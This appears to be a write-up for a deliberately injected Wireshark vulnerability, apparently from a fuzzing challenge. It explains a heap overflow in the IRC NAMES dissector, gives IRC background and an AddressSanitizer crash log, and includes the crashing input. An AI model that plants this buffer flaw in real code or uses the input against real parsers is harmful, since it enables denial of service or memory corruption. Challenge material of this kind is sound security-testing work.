# What functions and functionality is relevant?
The relevant functionality is contained within `dissect_irc_names` inside of the file `epan/dissectors/packet-irc.c`.

# Why is this vulnerable?
The vulnerability is a heap overflow in parsing the channel name parameters of the NAMES IRC command. Typically, channel names are limited by the server implementation. For example, UnrealIRCD uses 50 bytes. There is code in the function to correctly check and terminate the final channel name, but if other channels have a size greater than 50 bytes and are not the final channel, this will trigger the vulnerability.

# Is this a replay and/or is inspired by anything?
This is inspired by historical incorrect buffer calculations that lead to buffer overflows.

# What makes it interesting? 🌐 Introduction to IRC

**IRC (Internet Relay Chat)** is one of the oldest real-time messaging protocols still in use today. It allows users to connect to servers, join channels, and communicate in text-based chat rooms. IRC is a plaintext protocol, making it easy to analyze and reverse-engineer using network tools.

Clients send and receive human-readable command lines like `JOIN #channel`, `PRIVMSG`, or `QUIT`, and responses from the server include structured numeric codes.

---

# 🧪 Wireshark Protocol Trees and Subtrees

In **Wireshark**, dissectors parse protocol data into a structured **protocol tree**, shown in the middle pane of the GUI. Each line represents a **field** or **parsed element** of the packet.

- A **tree** is created using `proto_tree_add_item()` or similar functions.
- A **subtree** groups related fields (like all fields under an IRC command) using `proto_item_add_subtree()`.
- You can further add fields or computed values to a subtree with `proto_tree_add_text()` or `proto_item_append_text()`.

This hierarchical view helps users understand the structure and content of protocols like IRC.

---

# 📋 The IRC `NAMES` Command

The `NAMES` command is used by IRC clients to **request a list of nicknames** in one or more channels.

### Format:
```
NAMES [<channel>{,<channel>}]
```

- If no channels are specified, the server returns visible nicknames from all channels.
- If one or more channel names are given (comma-separated), only those channels are queried.

### Example:
```
NAMES #chat,#help
```

### Server Response:
```
:irc.example.net 353 alice = #chat :@bob +carol dan
:irc.example.net 366 alice #chat :End of /NAMES list.
```

- `353` is `RPL_NAMREPLY`, showing nicknames in the channel.
  - `@` = operator, `+` = voice privilege, others = regular users
- `366` is `RPL_ENDOFNAMES`, marking the end of the list.

In Wireshark, these replies can be dissected to show:
- The channel name
- Each nickname
- Associated roles based on prefix (`@`, `+`, etc.)

---

## Example crash

```
=================================================================
==18==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5060001c6493 at pc 0x0000005558c4 bp 0x7ffcf19de700 sp 0x7ffcf19ddec0
WRITE of size 131 at 0x5060001c6493 thread T0
SCARINESS: 45 (multi-byte-write-heap-buffer-overflow)
    #0 0x5558c3 in __asan_memcpy /src/llvm-project/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:63:3
    #1 0x81ac2a in memcpy /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34:10
    #2 0x81ac2a in tvb_memcpy /src/wireshark/epan/tvbuff.c:945:10
    #3 0x13ce548 in dissect_irc_names /src/wireshark/epan/dissectors/packet-irc.c:612:9
    #4 0x13cca82 in dissect_irc_request_command /src/wireshark/epan/dissectors/packet-irc.c:770:9
    #5 0x13cca82 in dissect_irc_request /src/wireshark/epan/dissectors/packet-irc.c:900:5
    #6 0x13cca82 in dissect_irc /src/wireshark/epan/dissectors/packet-irc.c:1235:17
    #7 0x73999d in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9
    #8 0x73999d in call_dissector_work /src/wireshark/epan/packet.c:975:9
    #9 0x7445f4 in call_dissector_only /src/wireshark/epan/packet.c:3621:8
    #10 0x7445f4 in call_all_postdissectors /src/wireshark/epan/packet.c:4166:3
    #11 0x1090737 in dissect_frame /src/wireshark/epan/dissectors/packet-frame.c:1438:5
    #12 0x73999d in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9
    #13 0x73999d in call_dissector_work /src/wireshark/epan/packet.c:975:9
    #14 0x735497 in call_dissector_only /src/wireshark/epan/packet.c:3621:8
    #15 0x735497 in call_dissector_with_data /src/wireshark/epan/packet.c:3634:8
    #16 0x735497 in dissect_record /src/wireshark/epan/packet.c:687:3
    #17 0x726d30 in epan_dissect_run /src/wireshark/epan/epan.c:666:2
    #18 0x59722b in LLVMFuzzerTestOneInput /src/wireshark/fuzz/fuzzshark.c:360:2
    #19 0x44bb70 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #20 0x436de5 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:327:6
    #21 0x43c87f in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:862:9
    #22 0x467b22 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #23 0x7fa61acea082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #24 0x42efcd in _start (/out/fuzzshark+0x42efcd)

DEDUP_TOKEN: __asan_memcpy--memcpy--tvb_memcpy
0x5060001c6493 is located 0 bytes after 51-byte region [0x5060001c6460,0x5060001c6493)
allocated by thread T0 here:
    #0 0x55793f in malloc /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:68:3
    #1 0x13ce4b0 in dissect_irc_names /src/wireshark/epan/dissectors/packet-irc.c:584:20
    #2 0x13cca82 in dissect_irc_request_command /src/wireshark/epan/dissectors/packet-irc.c:770:9
    #3 0x13cca82 in dissect_irc_request /src/wireshark/epan/dissectors/packet-irc.c:900:5
    #4 0x13cca82 in dissect_irc /src/wireshark/epan/dissectors/packet-irc.c:1235:17
    #5 0x73999d in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9
    #6 0x73999d in call_dissector_work /src/wireshark/epan/packet.c:975:9
    #7 0x7445f4 in call_dissector_only /src/wireshark/epan/packet.c:3621:8
    #8 0x7445f4 in call_all_postdissectors /src/wireshark/epan/packet.c:4166:3
    #9 0x1090737 in dissect_frame /src/wireshark/epan/dissectors/packet-frame.c:1438:5
    #10 0x73999d in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9
    #11 0x73999d in call_dissector_work /src/wireshark/epan/packet.c:975:9
    #12 0x735497 in call_dissector_only /src/wireshark/epan/packet.c:3621:8
    #13 0x735497 in call_dissector_with_data /src/wireshark/epan/packet.c:3634:8
    #14 0x735497 in dissect_record /src/wireshark/epan/packet.c:687:3
    #15 0x726d30 in epan_dissect_run /src/wireshark/epan/epan.c:666:2
    #16 0x59722b in LLVMFuzzerTestOneInput /src/wireshark/fuzz/fuzzshark.c:360:2
    #17 0x44bb70 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #18 0x436de5 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:327:6
    #19 0x43c87f in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:862:9
    #20 0x467b22 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #21 0x7fa61acea082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)

DEDUP_TOKEN: __interceptor_malloc--dissect_irc_names--dissect_irc_request_command
SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34:10 in memcpy
Shadow bytes around the buggy address:
  0x5060001c6200: fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa
  0x5060001c6280: 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00
  0x5060001c6300: 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 fa
  0x5060001c6380: fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa
  0x5060001c6400: 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00
=>0x5060001c6480: 00 00[03]fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5060001c6500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5060001c6580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5060001c6600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5060001c6680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x5060001c6700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==18==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000
0x4e,0x41,0x4d,0x45,0x53,0x20,0x23,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x2c,0x23,0x68,0x65,0x6c,0x6c,0x6f,
NAMES #aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,#hello
subprocess command returned a non-zero exit status: 1
```
